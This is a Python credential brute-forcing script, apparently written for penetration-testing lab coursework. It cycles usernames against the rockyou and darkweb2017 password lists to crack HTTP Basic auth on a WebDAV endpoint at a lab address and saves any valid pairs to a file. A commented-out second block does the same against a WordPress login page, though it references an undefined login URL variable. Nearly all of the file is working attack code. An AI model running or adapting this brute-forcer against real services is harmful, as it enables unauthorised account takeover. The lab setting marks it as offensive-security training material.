#!/usr/bin/python3

# Python script to read  users and passwords for WebDav auth



'''
username:pass
Host: 10.11.1.237
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Authorization: Basic dXNlcm5hbWU6cGFzcw==
'''

import requests
from requests.auth import HTTPBasicAuth

proxies = {
    "http": "http://10.11.0.60:8080"
}

user_file = '/usr/share/wordlists/users_admin_root.list'

pass_files = [
            '/usr/share/wordlists/darkweb2017-top1000.txt',
            '/usr/share/wordlists/rockyou.txt']

for pass_file in pass_files:
    with open(user_file) as u:
        for line in u:
            lineu = line.rstrip()
            with open(pass_file) as p:
                    for line in p:
                        linep = line.rstrip()
                        #payload = {lineu:linep}
                        #print(payload)
                        r = requests.get("http://10.11.1.237/webdav", auth=HTTPBasicAuth(lineu, linep))
                        reason = r.reason
                        print(lineu, ':', linep, ':', reason)

                        if reason != 'Authorization Required':
                           print("\n---> ", lineu + ":" + linep + " is a valid username:password!!! <--- \n")
                           with open('/root/oscplab/labtargets/2r00t/dot237/dot237_webdavbrute.txt', 'a') as output:
                               output.write("Valid username:password for 'http://10.11.1.237/webdav:'\n")
                               output.write("-------------------------------------------------------------\n")
                               output.write(lineu + ":" + linep + " is a valid username:password\n")






'''
import requests
from requests.auth import HTTPBasicAuth
import lxml
import xml
from lxml.html import fromstring

proxies = {
    "http": "http://10.11.0.60:8080"
}

webdav_login = 'http://10.11.1.237/webdav'
wp_admin = 'http://10.11.1.234/wp-admin/'

user_file = '/usr/share/wordlists/users_admin_root.list'

pass_files = ['/usr/share/wordlists/thinc_passwords.list',
              '/usr/share/wordlists/darkweb2017-top1000.txt',
              '/usr/share/wordlists/rockyou.txt']

for pass_file in pass_files:
    with open(user_file) as u:
        for line in u:
            lineu = line.rstrip()
            with open(pass_file) as p:
                    for line in p:
                        linep = line.rstrip()

                        with requests.Session() as s:
                            headers1 = {'Cookie': 'wordpress_test_cookie=WP Cookie check'}
                            payload = {'log': lineu, 'pwd': linep,
                                       'wp-submit': 'Log In', 'redirect_to': wp_admin, 'testcookie': '1'
                            }
                            print(payload)
                            r = s.post(wp_login, headers=headers1, data=payload)

                            status = r.status_code
                            response = r.text
                            print(lineu, ':', linep, ':', status, '\n')
                            #print(response)

                            tree = fromstring(r.content)
                            page_title = tree.findtext('.//title')
                            print(page_title)

                            if page_title != 'Business Statistics › Log In':
                                print("\n---> ", lineu + ":" + linep + " is a valid username:password!!! <--- \n")
                                with open('/root/oscplab/labtargets/2r00t/dot234/dot234_wpbrute.txt', 'a') as output:
                                    output.write("Valid username:password for: " + wp_login + "\n")
                                    output.write("-------------------------------------------------------------\n")
                                    output.write(lineu + ":" + linep + " is a valid username:password\n")
'''